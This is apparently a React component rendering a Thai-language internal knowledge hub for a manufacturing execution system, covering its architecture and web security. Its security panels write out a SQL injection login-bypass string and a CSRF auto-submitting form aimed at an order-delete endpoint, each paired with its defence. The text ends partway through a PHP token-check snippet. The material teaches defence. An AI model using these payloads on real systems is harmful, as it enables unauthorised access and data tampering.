
import React, { useState } from 'react';

export default function KnowledgeHubRaw({ activeHub, togglePanel, genShowView, toggleAutoPlay, genStep, genReset, csrfShowView, csrfStep, csrfReset }) {
  return (
    <>
      <div className="hub-wrap">
      <div className="hub-container">

        
        
        <div className="hub-section active" id="hoverview">
          <div className="progress-track"><div className="progress-fill" style={{ width: '100%' }}></div></div>
          <div className="hub-section-header">
            <div className="hub-section-title"><div className="hub-icon-box" style={{ background: 'rgba(59,130,246,0.08)', border: '1px solid rgba(59,130,246,0.2)' }}>&#128423;</div>System Architecture Map</div>
            <p className="hub-section-desc">แผนผังระบบรวมทั้งหมด (ออกแบบภายใต้กฎ Air-gapped ป้องกันการดึงข้อมูลจากภายนอก)</p>
          </div>
          
          <div style={{ display: 'flex', flexDirection: 'column', gap: '24px', background: 'var(--surface)', border: '1px solid var(--border)', borderRadius: '12px', padding: '24px' }}>
            
            
            <div style={{ border: '2px dashed #475569', padding: '20px', borderRadius: '8px', position: 'relative' }}>
               <div style={{ position: 'absolute', top: '-12px', left: '16px', background: 'var(--surface)', padding: '0 8px', fontWeight: 'bold', color: 'var(--text-dim)', fontSize: '12px' }}>Edge Layer (User Front-end)</div>
               <div style={{ display: 'flex', gap: '16px', flexWrap: 'wrap' }}>
                   <div className="hub-card" style={{ margin: '0', flex: '1', minWidth: '200px', '--card-color': 'var(--blue)' }}><h3>&#127760; Browser (React 19)</h3><p>Vite Bundled SPA (No CDNs)</p></div>
                   <div className="hub-card" style={{ margin: '0', flex: '1', minWidth: '200px', '--card-color': 'var(--slate)' }}><h3>&#128246; Hardware Scanners</h3><p>Auto-submit, Debounce Logic</p></div>
               </div>
            </div>

            
            <div style={{ textAlign: 'center', color: 'var(--text-dim)', margin: '-12px 0' }}>&#8595; HTTP REST / Axios (CSRF Protected) &#8595;</div>
            <div style={{ border: '2px dashed #6d28d9', padding: '20px', borderRadius: '8px', position: 'relative' }}>
               <div style={{ position: 'absolute', top: '-12px', left: '16px', background: 'var(--surface)', padding: '0 8px', fontWeight: 'bold', color: 'var(--text-dim)', fontSize: '12px' }}>Application Layer (API Gateway)</div>
               <div className="hub-card" style={{ margin: '0', width: '100%', '--card-color': 'var(--purple)' }}><h3>&#128187; PHP 8 API & Auth</h3><p>Strict JSON, Session & RBAC, Request Validation</p></div>
            </div>

            
            <div style={{ textAlign: 'center', color: 'var(--text-dim)', margin: '-12px 0' }}>&#8595; PDO Prepared Statements &#8595;</div>
            <div style={{ display: 'flex', gap: '24px', flexWrap: 'wrap' }}>
                
                
                <div style={{ flex: '2', minWidth: '280px', border: '2px dashed #047857', padding: '20px', borderRadius: '8px', position: 'relative' }}>
                   <div style={{ position: 'absolute', top: '-12px', left: '16px', background: 'var(--surface)', padding: '0 8px', fontWeight: 'bold', color: 'var(--text-dim)', fontSize: '12px' }}>Database Layer (Core)</div>
                   <div className="hub-card" style={{ margin: '0', width: '100%', '--card-color': 'var(--green)' }}><h3>&#128451; SQL Server 2016</h3><p>ONHAND, TRANSACTIONS, Stored Procedures</p></div>
                </div>

                
                <div style={{ flex: '1', minWidth: '220px', border: '2px dashed #b45309', padding: '20px', borderRadius: '8px', position: 'relative', display: 'flex', flexDirection: 'column', gap: '12px' }}>
                   <div style={{ position: 'absolute', top: '-12px', left: '16px', background: 'var(--surface)', padding: '0 8px', fontWeight: 'bold', color: 'var(--text-dim)', fontSize: '12px' }}>Machine Layer (IoT)</div>
                   <div className="hub-card" style={{ margin: '0', width: '100%', '--card-color': 'var(--amber)' }}><h3>&#128423; Node-RED</h3><p>Polling / WS Dashboard</p></div>
                   <div style={{ textAlign: 'center', color: 'var(--text-dim)', margin: '-6px 0' }}>&#8597; OPC UA</div>
                   <div className="hub-card" style={{ margin: '0', width: '100%', '--card-color': 'var(--amber)' }}><h3>&#9881; PLC / Sensors</h3><p>Press, Weld, Cut Data</p></div>
                </div>

            </div>

            
            <div style={{ textAlign: 'center', color: 'var(--text-dim)', margin: '-12px 0' }}>&#8595; Asynchronous Sync (RFC/IDoc) &#8595;</div>
            <div style={{ border: '2px dashed #b91c1c', padding: '20px', borderRadius: '8px', position: 'relative' }}>
               <div style={{ position: 'absolute', top: '-12px', left: '16px', background: 'var(--surface)', padding: '0 8px', fontWeight: 'bold', color: 'var(--text-dim)', fontSize: '12px' }}>Enterprise ERP Layer</div>
               <div className="hub-card" style={{ margin: '0', width: '100%', '--card-color': 'var(--red)' }}><h3>&#127986; SAP ERP</h3><p>Modules: Production (PP), Material (MM), Maintenance (PM), Quality (QM)</p></div>
            </div>

          </div>
        </div>


        <div className="hub-section" id="harch">
          <div className="progress-track"><div className="progress-fill" style={{ width: '100%' }}></div></div>
          <div className="hub-section-header">
            <div className="hub-section-title">
              <div className="hub-icon-box" style={{ background: 'rgba(79,156,249,0.1)', border: '1px solid rgba(79,156,249,0.2)' }}>&#127959;</div>
              System Architecture &amp; Modernization
            </div>
            <p className="hub-section-desc">เปรียบเทียบระบบเดิม (PHP/SSR) กับระบบใหม่ (React 19/SPA) และทำความเข้าใจหลักการ Decoupled Architecture</p>
          </div>

          <div className="detail-panel open" id="ha1">
            <div className="detail-header" onClick={() => { togglePanel('ha1') }}>
              <h3><span className="hchip hchip-blue">Core Concept</span>{'\u00A0'} SSR vs. SPA — การเปรียบเทียบสองสถาปัตยกรรม</h3>
              <span className="chevron">&#9662;</span>
            </div>
            <div className="detail-body"><div className="detail-content">
              <div className="hub-two">
                <div style={{ background: 'rgba(251,191,36,0.05)', border: '1px solid rgba(251,191,36,0.15)', borderRadius: '12px', padding: '18px' }}>
                  <div style={{ fontSize: '11px', fontWeight: '700', letterSpacing: '0.1em', textTransform: 'uppercase', color: 'var(--amber)', marginBottom: '8px' }}>ระบบเดิม (Legacy)</div>
                  <div style={{ fontSize: '15px', fontWeight: '700', marginBottom: '8px' }}>Server-Side Rendering (SSR)</div>
                  <p style={{ fontSize: '13px', color: 'var(--text-dim)' }}>เซิร์ฟเวอร์ประมวลผล PHP และสร้าง HTML ใหม่ทุกครั้งที่ผู้ใช้คลิก แล้วส่งหน้าเว็บใหม่ทั้งหน้ามายัง Browser</p>
                  <div style={{ display: 'flex', flexWrap: 'wrap', gap: '6px', marginTop: '12px' }}><span className="hub-tag">PHP</span><span className="hub-tag">Full Page Reload</span><span className="hub-tag">Server Load สูง</span></div>
                </div>
                <div style={{ background: 'rgba(79,156,249,0.05)', border: '1px solid rgba(79,156,249,0.15)', borderRadius: '12px', padding: '18px' }}>
                  <div style={{ fontSize: '11px', fontWeight: '700', letterSpacing: '0.1em', textTransform: 'uppercase', color: 'var(--blue)', marginBottom: '8px' }}>ระบบใหม่ (Modern)</div>
                  <div style={{ fontSize: '15px', fontWeight: '700', marginBottom: '8px' }}>Single Page Application (SPA)</div>
                  <p style={{ fontSize: '13px', color: 'var(--text-dim)' }}>โหลด HTML/JS เพียงครั้งเดียว แล้วดึงเฉพาะ JSON จาก API มา Update DOM โดยไม่โหลดหน้าใหม่</p>
                  <div style={{ display: 'flex', flexWrap: 'wrap', gap: '6px', marginTop: '12px' }}><span className="hub-tag">React 19</span><span className="hub-tag">API-driven</span><span className="hub-tag">UI ลื่นไหล</span></div>
                </div>
              </div>
              <div className="hub-diagram" style={{ marginTop: '18px' }}>
                <div className="hub-diagram-title">SSR Flow (PHP) — โหลดใหม่ทุกครั้ง</div>
                <div className="hflow-row"><span className="hbox hbox-amber">User Click</span><span className="harrow">--&gt;</span><span className="hbox hbox-amber">Server (PHP)</span><span className="harrow">--&gt;</span><span className="hbox hbox-amber">Database</span><span className="harrow">--&gt;</span><span className="hbox hbox-amber">HTML ใหม่ทั้งหน้า</span></div>
                <div className="hub-diagram-title" style={{ marginTop: '18px' }}>SPA Flow (React) — Update เฉพาะ Data</div>
                <div className="hflow-row"><span className="hbox hbox-blue">User Click</span><span className="harrow">--&gt;</span><span className="hbox hbox-blue">React (Browser)</span><span className="harrow">--&gt;</span><span className="hbox hbox-blue">API Call (JSON)</span><span className="harrow">--&gt;</span><span className="hbox hbox-blue">Update DOM เฉพาะส่วน</span></div>
              </div>
              <table className="hub-table">
                <thead><tr><th>เกณฑ์</th><th>SSR (PHP)</th><th>SPA (React)</th></tr></thead>
                <tbody>
                  <tr><td>การโหลดหน้า</td><td>โหลดใหม่ทุกครั้ง</td><td>โหลดครั้งเดียว</td></tr>
                  <tr><td>ความเร็ว UI</td><td>ช้า (รอ Server)</td><td>เร็ว (เฉพาะ Data)</td></tr>
                  <tr><td>ภาระ Server</td><td>สูง (render HTML)</td><td>ต่ำ (ส่งแค่ JSON)</td></tr>
                  <tr><td>การต่อ SAP</td><td>ซับซ้อน</td><td>ง่าย (API มาตรฐาน)</td></tr>
                </tbody>
              </table>
            </div></div>
          </div>

          <div className="detail-panel" id="ha2">
            <div className="detail-header" onClick={() => { togglePanel('ha2') }}>
              <h3><span className="hchip hchip-blue">Core Concept</span>{'\u00A0'} Decoupled Architecture — แยก Frontend/Backend อย่างเด็ดขาด</h3>
              <span className="chevron">&#9662;</span>
            </div>
            <div className="detail-body"><div className="detail-content">
              <p style={{ color: 'var(--text-dim)', fontSize: '14px', marginBottom: '14px' }}>ใน Decoupled Architecture, Frontend และ Backend สื่อสารผ่าน REST API (JSON) เท่านั้น ทำให้พัฒนาและ Scale แต่ละส่วนได้อิสระ</p>
              <div className="hub-diagram">
                <div className="hub-diagram-title">Decoupled Architecture — MES System</div>
                <div style={{ display: 'grid', gridTemplateColumns: '1fr auto 1fr', gap: '14px', alignItems: 'center', textAlign: 'center' }}>
                  <div><div className="hbox hbox-blue" style={{ justifyContent: 'center', display: 'flex', marginBottom: '8px' }}>React 19 Frontend</div><div style={{ fontSize: '11px', color: 'var(--text-dim)', lineHeight: '2' }}>UI Components<br/>React Router<br/>TailwindCSS<br/>Vite 8 Build</div></div>
                  <div><div style={{ fontSize: '20px', color: 'var(--blue)' }}>&#8596;</div><div style={{ fontSize: '10px', color: 'var(--blue)', fontWeight: '700', marginTop: '4px' }}>REST API<br/>JSON</div></div>
                  <div><div className="hbox hbox-green" style={{ justifyContent: 'center', display: 'flex', marginBottom: '8px' }}>PHP API Gateway</div><div style={{ fontSize: '11px', color: 'var(--text-dim)', lineHeight: '2' }}>Auth &amp; CSRF<br/>Business Logic<br/>PDO SQL Server<br/>Logging</div></div>
                </div>
                <div style={{ marginTop: '16px', textAlign: 'center' }}><div className="hbox hbox-amber" style={{ display: 'inline-flex', marginBottom: '6px' }}>SQL Server 2016</div></div>
                <div style={{ marginTop: '14px', display: 'flex', justifyContent: 'center', gap: '10px', flexWrap: 'wrap' }}><div className="hbox hbox-purple">SAP ERP</div><div className="hbox hbox-purple">Power BI</div><div className="hbox hbox-purple">Mobile App</div></div>
              </div>
              <div className="hub-alert hub-alert-success"><span className="hub-alert-icon">&#10003;</span><div><strong>ข้อดีสำคัญ:</strong> Backend เป็น API Gateway ทำให้ SAP เรียก API เดิมได้โดยตรงโดยไม่ต้องพัฒนา Interface ใหม่</div></div>
            </div></div>
          </div>

          <div className="detail-panel" id="ha3">
            <div className="detail-header" onClick={() => { togglePanel('ha3') }}>
              <h3><span className="hchip hchip-green">Tools</span>{'\u00A0'} Vite 8 &amp; Tailwind CSS — เครื่องมือสมัยใหม่</h3>
              <span className="chevron">&#9662;</span>
            </div>
            <div className="detail-body"><div className="detail-content">
              <div className="hub-two">
                <div><div className="hub-h4" style={{ color: 'var(--cyan)' }}>Vite 8 (Build Tool)</div><ul className="hub-list"><li>HMR — แก้โค้ดเห็นผลทันทีไม่ Reload</li><li>Cold Start เร็วกว่า Webpack 10-100x</li><li>Bundle สำหรับ Production ด้วย Rollup</li><li>รองรับ TypeScript, JSX, CSS Modules</li></ul></div>
                <div><div className="hub-h4" style={{ color: 'var(--cyan)' }}>Tailwind CSS (Utility-first)</div><ul className="hub-list"><li>เขียน Style ด้วย Class โดยตรงใน JSX</li><li>ไม่ต้องตั้งชื่อ CSS class เอง</li><li>Purge CSS อัตโนมัติ — ไฟล์เล็ก</li><li>Responsive ด้วย md: lg: xl:</li></ul></div>
              </div>
              <div className="hub-code"><span className="code-label">JSX + Tailwind</span><span className="c-kw">export function</span> <span className="c-fn">StatusBadge</span>({ status }) {
  <span className="c-kw">const</span> color = status === <span className="c-str">'active'</span>
    ? <span className="c-str">'bg-green-500/10 text-green-400 border-green-500/20'</span>
    : <span className="c-str">'bg-red-500/10 text-red-400 border-red-500/20'</span>;
  <span className="c-kw">return</span> &lt;<span className="c-fn">span</span> className={<span className="c-str">`px-3 py-1 rounded-full border text-xs font-semibold ${color}`</span>}&gt;{status}&lt;/<span className="c-fn">span</span>&gt;;
}</div>
            </div></div>
          </div>
        </div>

        
        <div className="hub-section" id="hsec">
          <div className="progress-track"><div className="progress-fill" style={{ width: '100%' }}></div></div>
          <div className="hub-section-header">
            <div className="hub-section-title"><div className="hub-icon-box" style={{ background: 'rgba(248,113,113,0.1)', border: '1px solid rgba(248,113,113,0.2)' }}>&#128274;</div>Security &amp; Vulnerabilities</div>
            <p className="hub-section-desc">ช่องโหว่ 4 ประเภทที่พบบ่อยในระบบ Web และวิธีป้องกันที่ถูกต้องในบริบทของ MES</p>
          </div>

          <div className="detail-panel open" id="hs1">
            <div className="detail-header" onClick={() => { togglePanel('hs1') }}><h3><span className="hchip hchip-red">HIGH RISK</span>{'\u00A0'} SQL Injection (SQLi) &amp; การป้องกันด้วย PDO (จำลองการโจมตี)</h3><span className="chevron">&#9662;</span></div>
            <div className="detail-body"><div className="detail-content">
              <div className="hub-alert hub-alert-danger"><span className="hub-alert-icon">&#9888;</span><div><strong>แก่นของปัญหา:</strong> Server นำ Input จากผู้ใช้ <strong>ต่อตรงๆ</strong> เข้าไปใน SQL String ทำให้ Hacker แทรกคำสั่ง SQL ปลอมเข้ามาได้</div></div>
              <div className="csrf-view-toggle">
                <button className="csrf-view-btn atk-active" id="sqliBtnAtk" onClick={() => { genShowView('sqli','atk') }}>&#128308; จำลองการโจมตี</button>
                <button className="csrf-view-btn" id="sqliBtnDef" onClick={() => { genShowView('sqli','def') }}>&#128994; การป้องกัน (PDO)</button>
              </div>
              <div className="csrf-scene show" id="sqliAtk">
                <div className="anim-layer"></div>
                <div className="csrf-actors">
                  <div className="csrf-actor" id="actor_sqliAtk_1"><div className="csrf-actor-icon">&#128520;</div><div className="csrf-actor-label label-bad">Hacker</div></div>
                  <div className="csrf-actor" id="actor_sqliAtk_2"><div className="csrf-actor-icon">&#128221;</div><div className="csrf-actor-label">Login Form</div></div>
                  <div className="csrf-actor" id="actor_sqliAtk_3"><div className="csrf-actor-icon">&#128187;</div><div className="csrf-actor-label">PHP Server</div></div>
                  <div className="csrf-actor" id="actor_sqliAtk_4"><div className="csrf-actor-icon">&#128451;</div><div className="csrf-actor-label">Database</div></div>
                </div>
                <div className="csrf-steps">
                  <div className="csrf-step-item step-atk" id="sqliA1"><div className="step-num step-num-atk">1</div><div className="step-text">&#128520; <strong>Hacker พิมพ์ใน Username:</strong><div className="csrf-inset-code" style={{ color: '#f87171' }}>' OR '1'='1' --</div>แทนที่จะพิมพ์ username จริงๆ</div></div>
                  <div className="csrf-step-item step-atk" id="sqliA2"><div className="step-num step-num-atk">2</div><div className="step-text">&#128187; <strong>PHP ต่อ String ตรงๆ</strong> — ได้ SQL:<div className="csrf-inset-code" style={{ color: '#f87171' }}>SELECT * FROM users
WHERE username = '' OR '1'='1' --'</div></div></div>
                  <div className="csrf-step-item step-atk" id="sqliA3"><div className="step-num step-num-atk">3</div><div className="step-text">&#128451; <strong>Database ประมวลผล:</strong> <span className="step-code-inline">'1'='1'</span> เป็นจริงเสมอ → WHERE ผ่านทุก row! ส่วน <span className="step-code-inline">--</span> คือ comment ตัดส่วนท้ายทิ้ง</div></div>
                  <div className="csrf-step-item step-atk" id="sqliA4"><div className="step-num step-num-atk">4</div><div className="step-text" style={{ color: 'var(--red)' }}>&#128165; <strong>ผลลัพธ์: ส่ง User ทุกคนคืนมา!</strong><br/><span style={{ color: 'var(--text-dim)' }}>Hacker Login ได้เป็น Admin โดยไม่รู้รหัสผ่านเลย</span></div></div>
                </div>
                <div className="csrf-ctrl">
                  <button className="csrf-ctrl-auto" onClick={() => { toggleAutoPlay('sqli','atk') }}>&#9654; Auto-play</button>
                  <button className="csrf-ctrl-btn atk-ctrl" id="sqliNextBtnAtk" onClick={() => { genStep('sqli','atk') }}>&#9654; แสดงขั้นตอนถัดไป</button>
                  <button className="csrf-ctrl-reset" onClick={() => { genReset('sqli','atk') }}>&#8635; เริ่มใหม่</button>
                  <span className="csrf-prog" id="sqliProgAtk">0 / 4 ขั้นตอน</span>
                </div>
              </div>
              <div className="csrf-scene" id="sqliDef">
                <div className="anim-layer"></div>
                <div className="csrf-actors">
                  <div className="csrf-actor" id="actor_sqliDef_1"><div className="csrf-actor-icon">&#128520;</div><div className="csrf-actor-label label-bad">Hacker</div></div>
                  <div className="csrf-actor" id="actor_sqliDef_2"><div className="csrf-actor-icon">&#128221;</div><div className="csrf-actor-label">Login Form</div></div>
                  <div className="csrf-actor" id="actor_sqliDef_3"><div className="csrf-actor-icon">&#128187;</div><div className="csrf-actor-label label-good">PHP + PDO</div></div>
                  <div className="csrf-actor" id="actor_sqliDef_4"><div className="csrf-actor-icon">&#128451;</div><div className="csrf-actor-label label-good">Database</div></div>
                </div>
                <div className="csrf-steps">
                  <div className="csrf-step-item step-def" id="sqliD1"><div className="step-num step-num-def">1</div><div className="step-text">&#128272; <strong>PDO แยก SQL Template กับข้อมูลออกจากกัน</strong> — ส่ง Query Plan ไปก่อน:<div className="csrf-inset-code" style={{ color: '#6ee7b7' }}>$stmt = $pdo->prepare(
  "SELECT * FROM users WHERE username = ?"
);</div></div></div>
                  <div className="csrf-step-item step-def" id="sqliD2"><div className="step-num step-num-def">2</div><div className="step-text">&#128187; <strong>Execute แยกกัน</strong> — ค่า input ส่งเป็น Parameter แยก ไม่ผสมกับ SQL:<div className="csrf-inset-code" style={{ color: '#6ee7b7' }}>$stmt->execute(["' OR '1'='1' --"]);
// Database รับแค่ค่า ไม่ใช่คำสั่ง</div></div></div>
                  <div className="csrf-step-item step-def" id="sqliD3"><div className="step-num step-num-def">3</div><div className="step-text">&#128451; <strong>Database ค้นหา username ที่ตรงกับ</strong> <span className="step-code-inline">\' OR \'1\'=\'1\' --</span> ตรงๆ — ไม่มี user ไหนชื่อนี้ใน Database!</div></div>
                  <div className="csrf-step-item step-def" id="sqliD4"><div className="step-num step-num-def">4</div><div className="step-text" style={{ color: 'var(--green)' }}>&#10003; <strong>ไม่พบข้อมูล → Login ล้มเหลว!</strong><br/><span style={{ color: 'var(--text-dim)' }}>Hacker ไม่ได้รับสิทธิ์ใดๆ — PDO ป้องกันได้สมบูรณ์</span></div></div>
                </div>
                <div className="csrf-ctrl">
                  <button className="csrf-ctrl-auto" onClick={() => { toggleAutoPlay('sqli','def') }}>&#9654; Auto-play</button>
                  <button className="csrf-ctrl-btn def-ctrl" id="sqliNextBtnDef" onClick={() => { genStep('sqli','def') }}>&#9654; แสดงขั้นตอนถัดไป</button>
                  <button className="csrf-ctrl-reset" onClick={() => { genReset('sqli','def') }}>&#8635; เริ่มใหม่</button>
                  <span className="csrf-prog" id="sqliProgDef">0 / 4 ขั้นตอน</span>
                </div>
              </div>
              <div className="insight-box"><span className="insight-icon">&#128161;</span><div><strong>หลักการ:</strong> PDO Database ได้รับ "แผนคำสั่ง" แยกจาก "ค่าตัวแปร" เสมอ ทำให้ไม่มีทางที่ Input ของผู้ใช้จะกลายเป็นคำสั่ง SQL ได้</div></div>
            </div></div>
          </div>

          <div className="detail-panel open" id="hs2">
            <div className="detail-header" onClick={() => { togglePanel('hs2') }}><h3><span className="hchip hchip-red">HIGH RISK</span>{'\u00A0'} CSRF — Cross-Site Request Forgery (อธิบายแบบละเอียด + จำลองการโจมตี)</h3><span className="chevron">&#9662;</span></div>
            <div className="detail-body"><div className="detail-content">

              
              <div className="hub-alert hub-alert-danger"><span className="hub-alert-icon">&#9888;</span><div><strong>แก่นของปัญหา:</strong> Browser แนบ Cookie ไปกับทุก Request ที่ส่งหา Server <em>โดยอัตโนมัติ</em> ไม่ว่าจะมาจากเว็บไหนก็ตาม — Hacker จึงหลอกให้ Browser ส่งคำสั่งในนาม "คุณ" ได้โดยที่คุณไม่รู้ตัว</div></div>

              <div className="hub-two" style={{ margin: '16px 0 0' }}>
                <div style={{ background: 'rgba(79,156,249,0.05)', border: '1px solid rgba(79,156,249,0.15)', borderRadius: '10px', padding: '14px' }}>
                  <div style={{ fontSize: '22px', marginBottom: '6px' }}>&#127850;</div>
                  <div style={{ fontSize: '13px', fontWeight: '700', marginBottom: '4px', color: 'var(--blue)' }}>Session Cookie</div>
                  <p style={{ fontSize: '12px', color: 'var(--text-dim)', lineHeight: '1.6' }}>พิสูจน์ว่า "คุณ Login แล้ว" — Browser ส่งไปอัตโนมัติทุกครั้งที่ URL ตรงกัน <strong style={{ color: 'var(--text)' }}>ห้ามกัน</strong>ได้</p>
                </div>
                <div style={{ background: 'rgba(52,211,153,0.05)', border: '1px solid rgba(52,211,153,0.15)', borderRadius: '10px', padding: '14px' }}>
                  <div style={{ fontSize: '22px', marginBottom: '6px' }}>&#128273;</div>
                  <div style={{ fontSize: '13px', fontWeight: '700', marginBottom: '4px', color: 'var(--green)' }}>CSRF Token</div>
                  <p style={{ fontSize: '12px', color: 'var(--text-dim)', lineHeight: '1.6' }}>รหัสสุ่มที่ฝังใน Form — Hacker <strong style={{ color: 'var(--text)' }}>อ่านไม่ได้</strong> เพราะ Same-Origin Policy ห้ามเว็บอื่นอ่านหน้า MES</p>
                </div>
              </div>

              
              <div className="csrf-view-toggle">
                <button className="csrf-view-btn atk-active" id="csrfBtnAtk" onClick={() => { csrfShowView('atk') }}>&#128308; จำลองการโจมตี (ไม่มี Token)</button>
                <button className="csrf-view-btn" id="csrfBtnDef" onClick={() => { csrfShowView('def') }}>&#128994; การป้องกัน (มี CSRF Token)</button>
              </div>

              
              <div className="csrf-scene show" id="csrfAtk">
                <div className="anim-layer"></div>
                <div className="csrf-actors">
                  <div className="csrf-actor" id="actor_csrfAtk_1"><div className="csrf-actor-icon">&#129489;</div><div className="csrf-actor-label">คุณ (เหยื่อ)</div></div>
                  <div className="csrf-actor" id="actor_csrfAtk_2"><div className="csrf-actor-icon">&#127760;</div><div className="csrf-actor-label">Browser</div></div>
                  <div className="csrf-actor" id="actor_csrfAtk_3"><div className="csrf-actor-icon">&#128520;</div><div className="csrf-actor-label label-bad">Hacker Site</div></div>
                  <div className="csrf-actor" id="actor_csrfAtk_4"><div className="csrf-actor-icon">&#128187;</div><div className="csrf-actor-label">MES Server</div></div>
                </div>
                <div className="csrf-steps">
                  <div className="csrf-step-item step-atk" id="atk1">
                    <div className="step-num step-num-atk">1</div>
                    <div className="step-text">&#129489; <strong>คุณ Login MES สำเร็จ</strong> &mdash; Browser เก็บ <span className="step-code-inline">&#127850; SessionID=ABC123</span> ไว้ในตัว พร้อมส่งให้ MES ทุกครั้งโดยอัตโนมัติ</div>
                  </div>
                  <div className="csrf-step-item step-atk" id="atk2">
                    <div className="step-num step-num-atk">2</div>
                    <div className="step-text">&#128520; <strong>Hacker สร้างหน้าเว็บ <span className="step-code-inline">fake-prize.com</span></strong> ที่ซ่อน Form เป้าหมายไว้ โดยที่คุณมองไม่เห็น:<div className="csrf-inset-code" style={{ color: '#f87171' }}>&lt;form action="https://mes.company.com/api/orders/delete" method="POST"&gt;
  &lt;input name="order_id" value="2001"&gt;
&lt;/form&gt;
&lt;script&gt;document.forms[0].submit()&lt;/script&gt;  &lt;!-- ส่งอัตโนมัติ! --&gt;</div></div>
                  </div>
                  <div className="csrf-step-item step-atk" id="atk3">
                    <div className="step-num step-num-atk">3</div>
                    <div className="step-text">&#128561; <strong>คุณเผลอเปิด fake-prize.com</strong> &mdash; Form ส่งตัวเองอัตโนมัติ Browser เห็น URL เป็น MES จึงแนบ <span className="step-code-inline">&#127850; SessionID=ABC123</span> ติดไปด้วยโดยไม่รู้ตัว!</div>
                  </div>
                  <div className="csrf-step-item step-atk" id="atk4">
                    <div className="step-num step-num-atk">4</div>
                    <div className="step-text" style={{ color: 'var(--red)' }}>&#128165; <strong>MES Server เห็น Cookie ถูกต้อง &rarr; ประมวลผลทันที!</strong><br/><span style={{ color: 'var(--text-dim)' }}>ลบ Job Order 2001 เสร็จ &mdash; โดยที่คุณไม่ได้ตั้งใจเลยแม้แต่น้อย</span></div>
                  </div>
                </div>
                <div className="csrf-ctrl">
                  <button className="csrf-ctrl-auto" onClick={() => { toggleAutoPlay('csrf','atk') }}>&#9654; Auto-play</button>
                  <button className="csrf-ctrl-btn atk-ctrl" id="csrfNextBtnAtk" onClick={() => { csrfStep('atk') }}>&#9654; แสดงขั้นตอนถัดไป</button>
                  <button className="csrf-ctrl-reset" onClick={() => { csrfReset('atk') }}>&#8635; เริ่มใหม่</button>
                  <span className="csrf-prog" id="csrfProgAtk">0 / 4 ขั้นตอน</span>
                </div>
              </div>

              
              <div className="csrf-scene" id="csrfDef">
                <div className="anim-layer"></div>
                <div className="csrf-actors">
                  <div className="csrf-actor" id="actor_csrfDef_1"><div className="csrf-actor-icon">&#129489;</div><div className="csrf-actor-label">คุณ (ผู้ใช้)</div></div>
                  <div className="csrf-actor" id="actor_csrfDef_2"><div className="csrf-actor-icon">&#127760;</div><div className="csrf-actor-label">Browser</div></div>
                  <div className="csrf-actor" id="actor_csrfDef_3"><div className="csrf-actor-icon">&#128520;</div><div className="csrf-actor-label label-bad">Hacker Site</div></div>
                  <div className="csrf-actor" id="actor_csrfDef_4"><div className="csrf-actor-icon">&#128187;</div><div className="csrf-actor-label label-good">MES Server</div></div>
                </div>
                <div className="csrf-steps">
                  <div className="csrf-step-item step-def" id="def1">
                    <div className="step-num step-num-def">1</div>
                    <div className="step-text">&#128272; <strong>Server สร้าง Token สุ่ม</strong> เก็บไว้ใน Session (ฝั่ง Server เท่านั้น): <span className="step-code-inline">csrf_token = a7Xk9pQmR8...</span><br/><small style={{ color: 'var(--text-dim)' }}>เปลี่ยนทุก Session &mdash; ยาว 64 ตัว &mdash; เดาไม่ได้</small></div>
                  </div>
                  <div className="csrf-step-item step-def" id="def2">
                    <div className="step-num step-num-def">2</div>
                    <div className="step-text">&#128196; <strong>ทุก Form มี Token ซ่อนอยู่</strong> ที่ Server ฝังไว้ให้:<div className="csrf-inset-code" style={{ color: '#6ee7b7' }}>&lt;form action="/api/orders/delete" method="POST"&gt;
  &lt;input type="hidden" name="csrf_token" value="a7Xk9pQmR8..."&gt;
  &lt;input name="order_id" value="2001"&gt;
&lt;/form&gt;</div></div>
                  </div>
                  <div className="csrf-step-item step-def" id="def3">
                    <div className="step-num step-num-def">3</div>
                    <div className="step-text">&#128520; <strong>Hacker พยายามส่ง Form ปลอมอีกครั้ง</strong> &mdash; แต่ไม่รู้ Token! เพราะ <strong>Same-Origin Policy</strong> กัน fake-prize.com ไม่ให้อ่านหน้า MES &rarr; Token ที่ส่งมา: <span className="step-code-inline">csrf_token = ???</span></div>
                  </div>
                  <div className="csrf-step-item step-def" id="def4">
                    <div className="step-num step-num-def">4</div>
                    <div className="step-text" style={{ color: 'var(--green)' }}>&#10003; <strong>Server ตรวจ: Session Token &ne; Form Token &rarr; ปฏิเสธทันที!</strong><br/><span style={{ color: 'var(--text-dim)' }}>ส่ง HTTP 403 Forbidden กลับไป &mdash; Job Order 2001 ปลอดภัย &#128737;&#65039;</span></div>
                  </div>
                </div>
                <div className="csrf-ctrl">
                  <button className="csrf-ctrl-auto" onClick={() => { toggleAutoPlay('csrf','def') }}>&#9654; Auto-play</button>
                  <button className="csrf-ctrl-btn def-ctrl" id="csrfNextBtnDef" onClick={() => { csrfStep('def') }}>&#9654; แสดงขั้นตอนถัดไป</button>
                  <button className="csrf-ctrl-reset" onClick={() => { csrfReset('def') }}>&#8635; เริ่มใหม่</button>
                  <span className="csrf-prog" id="csrfProgDef">0 / 4 ขั้นตอน</span>
                </div>
              </div>

              
              <div className="insight-box">
                <span className="insight-icon">&#128161;</span>
                <div><strong>กุญแจสำคัญ:</strong> Cookie ถูกส่งอัตโนมัติโดย Browser แต่ CSRF Token อยู่ใน HTML ของหน้า MES เท่านั้น &mdash; เว็บอื่น <strong>อ่านไม่ได้</strong> เพราะ Same-Origin Policy ของ Browser ห้ามไว้ นี่จึงเป็นเกราะป้องกันที่แข็งแกร่ง</div>
              </div>

              
              <div className="hub-h4" style={{ marginTop: '20px', color: 'var(--cyan)' }}>PHP &mdash; สร้างและตรวจ Token</div>
              <div className="hub-code"><span className="code-label">PHP</span><span className="c-cm">// สร้าง Token เมื่อ Login (ครั้งเดียว)</span>
<span className="c-var">$_SESSION</span>[<span className="c-str">'csrf_token'</span>] = <span className="c-fn">bin2hex</span>(<span className="c-fn">random_bytes</span>(<span className="c-num">32</span>));

<span className="c-cm">// ตรวจสอบทุก POST / PUT / DELETE</span>
<span className="c-kw">if</span> (<span className="c-var">$_SERVER</span>[<span className="c-str">'REQUEST_METHOD'</span>] !== <span className="c-str">'GET'</span>) {
    <span className="c-var">$token</span> = <span className="c-var">$_POST</span>[<span className="c-str">'csrf_token'</span>] ?? <span className="c-var">$_SERVER</span>[<span className="c-str">'HTTP_X_CSRF_TOKEN'</span>] ?? <span className="c-str">''</span>;
    <span className="c-kw">if</span> (!<span className="c-fn">hash_equals</span>(<span className="c-var">$_SESSION</span>[<span className="c-str">'csrf_token'</span>], <span className="c-var">$token</span>)) {
        <span className="c-fn">http_response_code</span>(<span className="c-num">403</span>);
